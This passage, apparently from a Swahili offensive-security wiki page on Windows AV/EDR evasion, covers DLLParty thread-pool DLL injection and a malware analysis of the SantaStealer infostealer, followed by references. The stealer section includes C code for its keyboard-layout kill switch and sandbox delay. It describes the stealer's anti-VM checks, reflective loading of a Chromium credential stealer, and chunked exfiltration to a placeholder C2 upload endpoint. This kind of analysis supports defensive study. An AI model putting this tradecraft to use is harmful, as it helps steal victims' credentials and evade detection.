PoC hupokea PID ya target (`DLLParty.exe <target_pid>`) na hutumia njia ya DLL iliyowekwa moja kwa moja ndani ya `DLLParty.cpp`; weka njia ambayo target inaweza kufikia kabla ya kujenga executable ya x64. Pia hutumia anwani ya `LoadLibraryA` ya process yake yenyewe kama callback ya mbali, hivyo hudhani anwani hiyo ni halali kwenye target. Code haikague urefu wa njia dhidi ya prefix ya baiti 0x58 wala kama utembezi wa workers ulipata nafasi kabla ya kutumia kipengele cha mwisho cha orodha. Thibitisha tena offsets binafsi, mpangilio wa stack na nafasi inayoweza kuandikwa kwa build ya target. Kuacha `CreateRemoteThreadEx`, shellcode na `VirtualAllocEx` hakuondoi uandishi kati ya processes au telemetry ya kupakia DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Mbinu za SantaStealer za Kukwepa Ugunduzi Bila Faili na Kuiba Credentials

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyochanganya AV bypass, anti-analysis na ufikiaji wa credentials katika workflow moja.<sup>[[24]](#references)</sup>

### Udhibiti wa mpangilio wa kibodi na kuchelewesha sandbox

- Alama ya usanidi (`anti_cis`) huorodhesha mipangilio ya kibodi iliyosakinishwa kupitia `GetKeyboardLayoutList`. Mpangilio wa Kicyrillic ukipatikana, sample huacha alama tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, hivyo kuhakikisha hailipuki kwenye maeneo yaliyotengwa huku ikiacha artifact ya uchunguzi.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya michakato, hukokotoa hash ya kila jina kwa checksum maalum ya rolling, kisha kulinganisha matokeo na blocklist zilizopachikwa za debugger/sandbox; hurudia checksum hiyo kwa jina la kompyuta na hukagua folda za kufanya kazi kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kiwango cha chini cha idadi ya michakato, muda mfupi tangu kuwashwa upya), huita `OpenServiceA("VBoxGuest")` ili kutambua VirtualBox additions, na hupima muda kabla na baada ya kusubiri ili kubaini single-stepping. Ikipata ishara yoyote, husitisha utekelezaji kabla modules hazijazinduliwa.

### Helper isiyo na faili + reflective loading ya hatua mbili kwa ChaCha20

- DLL/EXE kuu hupachika Chromium credential helper ambayo ama huhifadhiwa kwenye diski au hupakiwa mwenyewe kwenye kumbukumbu; katika hali isiyo na faili, hutatua imports/relocations yenyewe ili kuepuka kuandika faili zozote za helper.
- Helper hiyo huhifadhi DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (keys mbili za baiti 32 + nonces za baiti 12). Baada ya hatua zote mbili, hupakia blob kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Taratibu za ChromElevator hutumia direct-syscall reflective process hollowing kuingiza msimbo kwenye kivinjari hai cha Chromium, kurithi funguo za AppBound Encryption, na kusimbua nywila/cookies/kadi za mkopo moja kwa moja kutoka kwenye hifadhidata za SQLite licha ya uimarishaji wa ABE.

### Ukusanyaji wa moduli kwenye kumbukumbu na utoaji wa data kwa HTTP katika vipande

- `create_memory_based_log` hupitia jedwali la kimataifa la function-pointer `memory_generators` na kuanzisha thread moja kwa kila moduli iliyowezeshwa (Telegram, Discord, Steam, picha za skrini, nyaraka, viendelezi vya kivinjari, n.k.). Kila thread huandika matokeo kwenye buffers zinazoshirikiwa na kuripoti idadi ya faili baada ya muda wa kujiunga wa takriban sekunde 45.
- Baada ya kukamilika, kila kitu hubanwa kuwa ZIP kwa kutumia maktaba ya `miniz` iliyounganishwa kwa tuli kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma kumbukumbu hiyo kwa HTTP POST katika vipande vya MB 10 kwenda `http://<C2>:6767/upload`, huku ikijifanya kutumia mpaka wa kivinjari wa `multipart/form-data` (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` inapohitajika, na kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa kuunganisha upya kumekamilika.

## References

- [1] [Mbinu za Kina za Kukwepa: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, hakuna tena nafasi za bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – nyaraka](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mfano](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mfano](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC ya kuficha call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Mlolongo Mpya wa Maambukizi na Obfuscation ya ConfuserEx ya DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kukwepa ukaguzi wa hali ya Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia Vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Windows 11 Forwarded Exports (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa michakato na haki za ufikiaji](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Rejea ya EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Kizindua cha CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDR kwa Usaidizi wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Kuvunja Ganda la Kinga la Windows Defender kwa Mbinu ya Kuelekeza Upya Folda](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Rejea ya amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Mjini: Infostealer Mpya na Kabambe](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Usimbuaji wa Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Malware ya Node.js kwa Ufuatiliaji wa API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Mrembo Aliyelala: Kumlaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Uwekaji Sumu wa Vigezo vya Mchakato](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Mrembo Aliyelala II: CFG, CET, na Kuficha Stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ufichaji wa usingizi wa Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia Vibaya Chrome Remote Desktop katika Operesheni za Red Team: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kugeuza Dereva wa Urekebishaji wa Defender kuwa Primitive ya Uendeshaji wa Kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Msimbo wa ziada wa MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kuunda Functions Zinazojificha kwa Kutumia LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Chanzo cha InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Kazi ya CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kuunda Mchakato wa Mtoto wenye Ingizo na Matokeo Yaliyoelekezwa Upya](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Kutengeneza Upya Zana za C# kwa WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Kukompile Miradi ya C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Uthibitisho wa dhana na chanzo cha DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Kutumia Vibaya Ndani ya Thread Pool kwa Uingizaji wa DLL Bila Shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Seti ya data ya benchmark ya EMBER2024 na zana za thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Kutumia EMBER2024 Kutathmini Red Team Implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Kukwepa Utambuzi Unaotumia Machine Learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Mfumo wa kupakia .NET wa NetamLoader unaotumia XAML](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Orodhesho la AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Mbinu ya IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
